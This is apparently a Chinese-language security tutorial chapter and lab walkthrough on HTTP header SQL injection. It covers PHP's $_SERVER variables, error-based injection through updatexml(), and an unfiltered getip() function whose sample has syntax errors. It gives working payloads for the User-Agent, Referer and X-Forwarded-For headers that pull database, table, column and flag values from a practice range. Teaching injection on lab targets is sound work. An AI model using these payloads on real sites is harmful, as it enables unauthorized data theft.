# chapter 3.3 - HEAD Injection

[TOC]

## 0x01 原理与相关概念

### HTTP请求头（HEAD）

包含的常用信息：

1. User-Agent：浏览器身份标识的字符串。
2. Cookie：个人认证和跨页面固定参数。
3. Referer：表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏览器带到了当前页面。

HEAD注入即在向页面传参时将payload构建在HTTP请求头的位置。

### 超全局变量

> 在PHP中许多的预定义变量都是超全局的，这意味着它们在一个脚本的全部作用域中都可用

|   超全局变量 |                             含义                             |
| -----------: | :----------------------------------------------------------: |
|    $_REQUEST |         获取GET/POST/COOKIE（新版本不能获取COOKIE）          |
|       $_POST |                         获取POST传参                         |
|        $_GET |                         获取GET传参                          |
|     $_COOKIE |                        获取COOKIE传参                        |
| **$_SERVER** | （※功能强大） 包含了诸如头信息(HEADER)、路径(PATH)、以及脚本位置等信息的数组 |

常用的$_SERVER参数获取：

$_SERVER['HTTP_REFERER']  --- 获取Referer请求头数据

$_SERVER["HTTP_USER_AGENT"]  --- 获取用户相关信息，包括用户浏览器、操作系统等信息。

$_SERVER["REMOTE_ADDR"]  --- 浏览网页的用户IP。

### updatexml()函数

updatexml() 是更新xml文档的函数，语法：

```mysql
updatexml([locate_content],[PATH],[update_content])
```

在正常的使用中，我们通过把三个参数分别填入目标XML内容，XML文档路径，更新的XML内容来对XML文档进行更新。但是当我们在XML文档路径填入特殊符号（如：`!`和`~`）时，由于不符合第二个参数所需要的Xpath格式的字符串于是将错误路径进行报错，于是利用这个特性我们可以构成以下payload：

```mysql
updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
#可见PATH部分我们使用的以下函数：
concat(0x7e,(SELECT database()),0x7e)
#实际上为拼接字符串：
~[SELECT database()]~ -- 由于MySQL执行十六进制字符串，"~"对对应的便是"0x7e"
```

于是在执行时，数据库便会在执行了此子查询后将错误信息报告出来，实现了报错注入。

### X-Forwarded-For参数

当今多数缓存服务器的用户为了通过缓存的方式降低外部带宽，常常鼓励或强制用户使用代理服务器接入互联网。而WEB服务器为了能够获取到用户的真实IP便会读取用户请求中的`X-Forwarded-For`参数(如果存在)。

以下的GetIP函数为大量网站及CMS广泛使用：

```php
function getip(){
    if(getenv('HTTP_CLIENT_IP')){
        $ip = getenv('HTTP_CLIENT_IP');
    }else if(getenv('HTTP_X_FORWARDED_FOR'){
        $ip = getenv('HTTP_X_FORWARDED_FOR');
    }else if getenv('HTTP_X_FORWARDED'){
        $ip = getenv('HTTP_X_FORWARDED');
    }else if getenv('HTTP_FORWARDED_FOR'){
        $ip = getenv('HTTP_FORWARDED_FOR');
    }else if getenv('HTTP_FORWARDED'){
        $ip = getenv('HTTP_FORWARDED'); 
        //以上通过X-FORWARDED-FOR参数均能传参，为客户端指定的向代理转发的真实IP
    }else{
        $ip = $_SERVER['REMOTE_ADDR']; 
        //REMOTE_ADDR代表着与服务器建立TCP链接的目标客户端IP，如果存在代理，则为代理机器的IP值
    }
    return $ip;
}
```

由上述源码可见，在WEB服务器获取用户或代理IP时并没有进行过滤，于是便存在了注入漏洞。

## 0x02 注入思路

1. 暴破出弱用户名及密码

   由于HEADER的验证保存需要空间成本，所以通常不会记录登录失败的用户，要进行暴破登入

2. 在HTTP请求头中设置payload

3. 通过添加或修改X-Forwarded-For参数设置payload

4. 通过页面内数据库报错获取信息

## 0x03 靶场实战

1. 暴破出用户名和密码

   ​	<img src="https://i.loli.net/2020/11/16/dYPlkCnaZsFS3O5.png" alt="1.png" style="zoom:67%;" />

2. 审查源码，发现传参方式为USER_AGENT

   ```php
   $_SERVER['HTTP_USER_AGENT']
   ```

   ​	<img src="https://i.loli.net/2020/11/16/8awWUo9tsjbul6Z.png" alt="源码1.png" style="zoom:70%;" />

3. 审查源码，发现POST注入的表单框由于添加了转义字符无法实现SQL注入

4. 在请求头设置payload

   1. 在靶场1中使用USER-AGENT传参

      ```mysql
      1' and updatexml(1,concat(0x7e,(select database())),1),'3') -- qwe
      ```

      ​	![3.png](https://i.loli.net/2020/11/16/PwSYD6NUxcjpZme.png)

      **数据库在页面上显示出报错：**

      ![4.png](https://i.loli.net/2020/11/16/SsUhRn2mft173GB.png)

      **按照常规SQL注入方法替换payload进行注入**

      ```mysql
      1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),'3') -- qwe 找表名
      
      1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='flag_head' limit 1,1)),1),'3') -- qwe 找字段名
      
      1' and updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 1,1)),1),'3') -- qwe 找flag
      ```

      ![5.png](https://i.loli.net/2020/11/16/vrTAq4pmWzUblO8.png)

      <img src="https://i.loli.net/2020/11/16/8OpDISXFV7P21lU.png" alt="6.png" />

      <img src="https://i.loli.net/2020/11/16/8OpDISXFV7P21lU.png" alt="6.png" style="zoom:67%;" />

      ![7.png](https://i.loli.net/2020/11/16/z1LjuKcdFkSBM6y.png)

   2. 在靶场2中将Header改为Referer传参

   3. 在靶场3中使用X-Forward-For传参

      ```php
      X-Forwarded-For: 1' and updatexml(1,concat(0x7e,(select database())),1),'3') -- qwe
      ```

      

      ![8.png](https://i.loli.net/2020/11/16/IQxMop2VlfurCRZ.png)

      ![9.png](https://i.loli.net/2020/11/16/XDqIB1WpQZye5iY.png)

   

   

## 0x03 思考与要点

1. X-Forward-For参数在HEAD内本不包含时可以尝试手动添加。
2. HEAD内所有参数传参时记得在参数名冒号后加空格。
3. `and`表示逻辑与，`or`表示逻辑或，按优先级排序`and > or`。在注入过程中可能因为函数的结合问题影响优先级，可以分别尝试and和or。



